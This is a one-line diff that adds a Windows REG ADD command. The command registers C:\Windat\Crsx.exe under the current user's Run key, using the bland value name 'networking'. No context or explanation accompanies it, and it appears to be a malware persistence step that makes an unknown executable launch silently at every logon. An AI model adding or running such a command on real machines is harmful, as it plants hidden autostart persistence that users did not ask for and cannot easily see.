@@ -1,0 +1,1 @@
+REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v networking /t REG_SZ /d "C:\Windat\Crsx.exe"
